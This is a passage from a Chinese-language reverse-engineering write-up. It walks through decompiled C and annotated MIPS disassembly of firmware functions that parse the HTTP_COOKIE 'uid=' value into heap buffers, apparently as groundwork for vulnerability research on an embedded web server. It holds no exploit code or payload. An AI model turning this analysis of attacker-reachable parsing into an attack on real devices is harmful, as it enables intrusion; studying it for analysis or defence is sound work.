    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    uVar1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>SUB_00402290<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> uVar1<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>反汇编结果不好，直接看下面MIPS汇编代码分析：</p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4B0                                          # sess_get_uid<span class="token operator">+</span>234p
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4B0                                          # DATA XREF<span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4B0                 lui     $gp<span class="token punctuation">,</span> <span class="token number">0x43</span>  # <span class="token string">'C'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4B4                 bnez    $a0<span class="token punctuation">,</span> loc_40E4C4 <span class="token comment" spellcheck="true">//第一个参数也就是string_new不为0则跳转</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4B8                 li      $gp<span class="token punctuation">,</span> <span class="token number">0x4346D0</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4BC                 jr      $ra
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4C0                 li      $v0<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4C4  # <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4C4
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4C4 loc_40E4C4<span class="token punctuation">:</span>                              # CODE XREF<span class="token punctuation">:</span> sobj_strcmp<span class="token operator">+</span>4j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4C4                 lw      $a0<span class="token punctuation">,</span> <span class="token function">0x14</span><span class="token punctuation">(</span>$a0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//获取string_ new0x14处的内容也就是字符串的内容</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4C8                 nop
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4CC                 bnez    $a0<span class="token punctuation">,</span> loc_40E4D8<span class="token comment" spellcheck="true">//0x14处不为0则跳转loc_40E4D8</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4D0                 lui     $v0<span class="token punctuation">,</span> <span class="token number">0x42</span>  # <span class="token string">'B'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4D4                 addiu   $a0<span class="token punctuation">,</span> $v0<span class="token punctuation">,</span> <span class="token punctuation">(</span>aHttp1_1301Move<span class="token operator">+</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x420000</span><span class="token punctuation">)</span>  # s1
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4D8
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4D8 loc_40E4D8<span class="token punctuation">:</span>                              # CODE XREF<span class="token punctuation">:</span> sobj_strcmp<span class="token operator">+</span>1Cj
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4D8                 la      $t9<span class="token punctuation">,</span> strcmp <span class="token comment" spellcheck="true">//进入strcmp进行比较</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4DC                 nop
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4E0                 jr      $t9 <span class="token punctuation">;</span> strcmp
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4E4                 nop</code></pre>
<p>该函数的作用比较string_new的0x14处的字符串是否=’uid’。   </p>
<h2 id="sobj-get-string-int-param-1"><a href="#sobj-get-string-int-param-1" class="headerlink" title="sobj_get_string(int param_1)"></a>sobj_get_string(int param_1)</h2><p>该函数的参数只有一个是sobj_new()申请结构体的地址   </p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sobj_get_string</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>

  iVar1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    iVar1 <span class="token operator">=</span> <span class="token number">0x419b10</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> iVar1<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>汇编代码：</p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>globl sobj_get_string
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1CC sobj_get_string<span class="token punctuation">:</span>                         # CODE XREF<span class="token punctuation">:</span> sub_403794<span class="token operator">+</span>8Cp
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1CC                                          # sub_403BC8<span class="token operator">+</span>4FCp <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1CC                 beqz    $a0<span class="token punctuation">,</span> locret_40E1EC <span class="token comment" spellcheck="true">//为0跳转0x40E1EC</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1D0                 move    $v1<span class="token punctuation">,</span> $zero
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1D4                 lw      $v0<span class="token punctuation">,</span> <span class="token function">0x14</span><span class="token punctuation">(</span>$a0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//将0x14处的地址赋给v0</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1D8                 nop
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1DC                 bnez    $v0<span class="token punctuation">,</span> locret_40E1EC 
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1E0                 move    $v1<span class="token punctuation">,</span> $v0 <span class="token comment" spellcheck="true">//v0给v1</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1E4                 lui     $v0<span class="token punctuation">,</span> <span class="token number">0x42</span>  # <span class="token string">'B'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1E8                 addiu   $v1<span class="token punctuation">,</span> $v0<span class="token punctuation">,</span> <span class="token punctuation">(</span>aHttp1_1301Move<span class="token operator">+</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x420000</span><span class="token punctuation">)</span>  # <span class="token string">""</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1EC
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1EC locret_40E1EC<span class="token punctuation">:</span>                           # CODE XREF<span class="token punctuation">:</span> sobj_get_stringj
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1EC                                          # sobj_get_string<span class="token operator">+</span>10j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1EC                 jr      $ra <span class="token comment" spellcheck="true">//v1给v0，然后出去了返回值就是v0</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1F0                 move    $v0<span class="token punctuation">,</span> $v1 
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1F0  # End of function sobj_get_string</code></pre>
<p>可以看出该函数的作用是获取参数（sobj_new()中0x14处的堆）的字符串,返回值是v0=sobj_new()中0x14的值。 </p>
<h2 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h2><p>从环境变量中获取对应值：例如getenv(“HTTP_COOKIE”)则函数返回值v0中存放着返回的HTTP_COOKIE=之后的‘uid=xxxxxx’</p>
<p>例如运行前a0是参数是0x41A5cc(0x41a5cc存放的就是字符串’HTTP_COOKIE’)</p>
<p><img src="getenv()1.png" alt=""></p>
<p>getenv()运行完了之后返回结果存放在V0处</p>
<p><img src="getenv()2.png" alt=""></p>
<p> V0=0x76fff32b </p>
<p><img src="getenv()3.png" alt=""></p>
<p>往前一些可以看到0x76fff31f中明显可以看到HTTP_COOKIE=uid=xxxx</p>
<p><img src="getenv()4.png" alt=""></p>
<p>  getenv()也就是将环境变量=之后的内容取出</p>
<h2 id="sobj-strdup-int-param-1"><a href="#sobj-strdup-int-param-1" class="headerlink" title="sobj_strdup(int param_1)"></a>sobj_strdup(int param_1)</h2><p>该函数参数只有一个：也是sobj_new()申请的结构体，整个函数判断流程是，如果a0不等于0则利用strdup将a0+0x14处的堆内容拷贝到一个新申请的空间。</p>
<p>strdup的作用如下：</p>
<p>The <strong>_strdup</strong> function calls <strong>malloc</strong> to allocate storage space for  a copy of <em>strSource</em> and then copies <em>strSource</em> to the allocated  space.</p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>globl sobj_strdup
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E830</span> sobj_strdup<span class="token punctuation">:</span>                             # CODE XREF<span class="token punctuation">:</span> sub_406B58<span class="token operator">+</span><span class="token number">60</span>p
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E830</span>                                          # sub_406B58<span class="token operator">+</span>B0p <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E830</span> lui     $gp<span class="token punctuation">,</span> <span class="token number">0x43</span>  # <span class="token string">'C'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E834</span> bnez    $a0<span class="token punctuation">,</span> loc_40E844
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E838</span> li      $gp<span class="token punctuation">,</span> <span class="token number">0x4346D0</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E83C jr      $ra
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E840</span> move    $v0<span class="token punctuation">,</span> $zero
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E844</span>  # <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E844</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E844</span> loc_40E844<span class="token punctuation">:</span>                              # CODE XREF<span class="token punctuation">:</span> sobj_strdup<span class="token operator">+</span><span class="token number">4</span>j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E844</span> lw      $a0<span class="token punctuation">,</span> <span class="token function">0x14</span><span class="token punctuation">(</span>$a0<span class="token punctuation">)</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E848</span> la      $t9<span class="token punctuation">,</span> unk_7676CDA0 <span class="token comment" spellcheck="true">//strdup</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E84C bnez    $a0<span class="token punctuation">,</span> loc_40E85C
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E850</span> nop
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E854</span> la      $a0<span class="token punctuation">,</span> <span class="token punctuation">(</span>aHttp1_1301Move<span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">)</span>      # s
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E85C
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E85C loc_40E85C<span class="token punctuation">:</span>                              # CODE XREF<span class="token punctuation">:</span> sobj_strdup<span class="token operator">+</span>1Cj
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E85C jr      $t9 <span class="token punctuation">;</span> strdup <span class="token comment" spellcheck="true">//strdup</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0040E860</span> nop</code></pre>
<h1 id="sess-get-uid-undefined4-param-1"><a href="#sess-get-uid-undefined4-param-1" class="headerlink" title="sess_get_uid(undefined4 param_1)"></a>sess_get_uid(undefined4 param_1)</h1><p>最后整体分析一下sess_get_uid()函数，该函数的参数是上一个sobj_new()的结构体地址   </p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sess_get_uid</span><span class="token punctuation">(</span>undefined4 param_1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token comment" spellcheck="true">//param_1 = a0 = s5 = 0x42e008是sess_get_uid()上一个sobj_new()的返回值</span>
  <span class="token keyword">int</span> string_new<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>strings_new_addr<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>http_cookie<span class="token punctuation">;</span>
  undefined4 uVar1<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>pcVar2<span class="token punctuation">;</span>
  <span class="token keyword">int</span> http_cookie_addr<span class="token punctuation">;</span>
  uint flag<span class="token punctuation">;</span>
  undefined <span class="token operator">*</span>pcVar3<span class="token punctuation">;</span>

  string_new <span class="token operator">=</span> <span class="token function">sobj_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//运行完第一次sobj_new()，v0 = 0x42e048并s2 = v0 = 0x42e048</span>
  strings_new_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sobj_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//第二次运行完sobj_new()，v0 = 0x42e068</span>
  http_cookie <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_COOKIE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//v0= 'uid=' 将HTTP_COOKIE=后面的值取出，s3 = v0</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string_new <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>strings_new_addr <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>http_cookie <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//第一个状态</span>
LAB_00407e28<span class="token punctuation">:</span>
    http_cookie_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>http_cookie<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>http_cookie_addr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> LAB_00407ec4<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//如果达到结尾/x00处的时候进入0x407ec4</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
LAB_00407db0<span class="token punctuation">:</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>http_cookie_addr <span class="token operator">==</span> <span class="token number">0x3b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//第一个状态之后进入此处判断是否为';'</span>
        flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token comment" spellcheck="true">/* 遇到= */</span>
        flag <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//当遇到'='号时，flag = 2 进入第三个状态</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>http_cookie_addr <span class="token operator">!=</span> <span class="token number">0x3d</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//如果也不是等号就将字符放入第一个sobj_new生成的0x42e048对应的0x14申请的堆空间存储</span>
          <span class="token function">sobj_add_char</span><span class="token punctuation">(</span>string_new<span class="token punctuation">,</span>http_cookie_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
          flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//并且将状态标准转化为1进入第二个状态，然后一直加直到把'uid'加进去，遇到等号之后直接跳到LAB_00407e24，跳过'='</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//第一个进入的状态</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>http_cookie_addr <span class="token operator">!=</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">sobj_free</span><span class="token punctuation">(</span>string_new<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将s2 = 0x42e048也就是第一次sobj_new生成结构体中的0x14处的堆释放掉并清0</span>
            <span class="token function">sobj_free</span><span class="token punctuation">(</span>strings_new_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将s3 = 0x42e068也就是第二次sobj_new生成结构体中的0x14处的堆释放掉并清0</span>
            <span class="token keyword">goto</span> LAB_00407db0<span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          <span class="token keyword">goto</span> LAB_00407e24<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        http_cookie <span class="token operator">=</span> http_cookie <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LAB_00407e28<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//进入第三个状态</span>
                    <span class="token comment" spellcheck="true">/* 遇到=后紧接着遇到; */</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>http_cookie_addr <span class="token operator">==</span> <span class="token number">0x3b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//遇到分号进入状态四</span>
          flag <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
          <span class="token keyword">goto</span> LAB_00407e24<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">sobj_add_char</span><span class="token punctuation">(</span>strings_new_addr<span class="token punctuation">,</span>http_cookie_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将uid=之后内容存入s3 = 0x42e068也就是第二次sobj_new生成结构体中的0x14处的堆中，将不等于';'的字符全部输入</span>
        http_cookie <span class="token operator">=</span> http_cookie <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LAB_00407e28<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
                    <span class="token comment" spellcheck="true">/* 遇到分号之后比较是否当前字符串是否是uid= */</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//进入状态四，比较第一次sobj_new()的s2 = 0x42e048中0x14处的内容是不是'uid'</span>
        iVar1 <span class="token operator">=</span> <span class="token function">sobj_strcmp</span><span class="token punctuation">(</span>string_new<span class="token punctuation">,</span><span class="token operator">&amp;</span>DAT_0041a5d8<span class="token punctuation">)</span><span class="token punctuation">;</span>
        flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> LAB_00407e24<span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LAB_00407e40<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
LAB_00407e24<span class="token punctuation">:</span>
    http_cookie <span class="token operator">=</span> http_cookie <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">goto</span> LAB_00407e28<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
LAB_00407ee0<span class="token punctuation">:</span>
  pcVar3 <span class="token operator">=</span> getenv<span class="token punctuation">;</span>
  pcVar2 <span class="token operator">=</span> <span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">;</span>
LAB_00407e48<span class="token punctuation">:</span>
  uVar1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>pcVar3<span class="token punctuation">)</span><span class="token punctuation">(</span>pcVar2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//sobj_get_string(strings_new_addr)获取第二次运行完sobj_new()，s3 = v0 = 0x42e068中0x14处堆中的字符串</span>
  <span class="token function">sobj_add_string</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span>uVar1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将得到字符串拷贝到param_1 = s5 = 0x42e008是sess_get_uid()上一个sobj_new()的0x14处堆空间中</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>string_new <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">sobj_del</span><span class="token punctuation">(</span>string_new<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>strings_new_addr <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Could not recover jumptable at 0x00407ebc. Too many branches */</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Treating indirect jump as call */</span>
    <span class="token function">sobj_del</span><span class="token punctuation">(</span>strings_new_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
LAB_00407ec4<span class="token punctuation">:</span>
  iVar1 <span class="token operator">=</span> <span class="token function">sobj_strcmp</span><span class="token punctuation">(</span>string_new<span class="token punctuation">,</span><span class="token operator">&amp;</span>DAT_0041a5d8<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//进入状态四，比较第一次sobj_new()的s2 = 0x42e048中0x14处的内容是不是'uid'</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
LAB_00407e40<span class="token punctuation">:</span>
    pcVar3 <span class="token operator">=</span> sobj_get_string<span class="token punctuation">;</span>
    pcVar2 <span class="token operator">=</span> strings_new_addr<span class="token punctuation">;</span>
    <span class="token keyword">goto</span> LAB_00407e48<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">goto</span> LAB_00407ee0<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>纵观整个函数的功能就是将uid=后面的内容拷贝到param_1的0x14处的堆地址空间。函数的参数是之前sobj_new()申请的结构体地址，地址存储在s5寄存器中，进入函数之后又存储在了s6中。   </p>
<p>完整的流程是：</p>
<p>首先通过两次sobj_new()申请两个结构体并将地址分别存储在s2,s3中。之后利用getenv()将环境变量”HTTP_COOKIE”中的内容也就是’uid=xxxx’字符串的地址放在v0中，紧接着s1=0，s5=0x3b(分号’;’)，s7=0x20(空格’ ‘)其中寄存器s1中存着的是状态标志，不同状态标志进行不同的处理。</p>
<p>s1=0标志着初始状态也就是第一个状态，先判断HTTP_COOKIE环境变量中第一个字符是否是空格，是空格则跳过继续判断，不是空格则先通过sobj_free()将sobj_new()申请的结构体0x14处的堆free并清0。跳转到0x00407db0判断不为0x3b(分号；)，继续判断是否0x3d(等号)，如果都不是，则将该字符通过sobj_add_char()存储在s2中0x14处的堆中，并将s1=1，标志着进入第二个状态。</p>
<p>s1=1第二个状态，不断读取字符串内容直到遇到0x3d(等号)，遇到等号则跳过等号并且s1=2，进入第三个状态。正常而言结束第二个状态时s2+0x14中应该存储的是’uid’。</p>
<p>s1=2第三个状态，将’uid=’之后的字符串内容通过sobj_add_char()存储在s3中0x14处的堆中。如果遇到字符等于0x3b(分号)则将s1=3进入第四个状态，正常结束状态是到遇到结束字符’\x00’处。</p>
